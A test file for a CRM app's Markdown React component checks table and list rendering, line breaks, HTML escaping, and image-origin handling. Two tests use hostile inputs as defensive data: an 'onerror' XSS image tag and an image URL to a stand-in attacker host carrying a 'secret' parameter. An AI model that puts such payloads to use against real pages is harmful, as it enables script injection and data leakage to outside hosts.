import { render, screen } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import { Markdown } from '../../client/components/crm/markdown.js';
import { keepLineBreaks } from '../../client/components/crm/line-breaks.js';

describe('Markdown', () => {
  it('renders GFM structure', () => {
    render(
      <Markdown compact>
        {'## Pipeline\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |'}
      </Markdown>,
    );
    expect(screen.getByRole('heading', { level: 2 })).toHaveTextContent(
      'Pipeline',
    );
    expect(screen.getAllByRole('listitem')).toHaveLength(2);
    expect(screen.getByRole('table')).toBeInTheDocument();
  });

  it('escapes HTML instead of rendering it', () => {
    const { container } = render(
      <Markdown compact>{'<img src=x onerror=alert(1)> plain'}</Markdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container).toHaveTextContent('<img src=x onerror=alert(1)> plain');
  });

  it('shows an image from another origin as a link instead of loading it', () => {
    const leak = 'https://attacker.example/p.png?d=secret';
    const { container } = render(
      <Markdown compact>{`![chart](${leak})`}</Markdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    const link = container.querySelector('a');
    expect(link).toHaveAttribute('href', leak);
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(link).toHaveTextContent('chart');
  });

  it('loads images of its own origin', () => {
    const { container } = render(
      <Markdown>{'![logo](/main/assets/logo.png)'}</Markdown>,
    );
    expect(container.querySelector('img')).toHaveAttribute(
      'src',
      '/main/assets/logo.png',
    );
  });

  it('keeps single line breaks in chat replies but not inside code', () => {
    expect(keepLineBreaks('a\nb\n\nc')).toBe('a  \nb\n\nc');
    expect(keepLineBreaks('```\nx\ny\n```\nz\nw')).toBe(
      '```\nx\ny\n```  \nz  \nw',
    );
    const { container } = render(
      <Markdown compact>{'line one\nline two'}</Markdown>,
    );
    expect(container.querySelectorAll('br')).toHaveLength(1);
  });
});
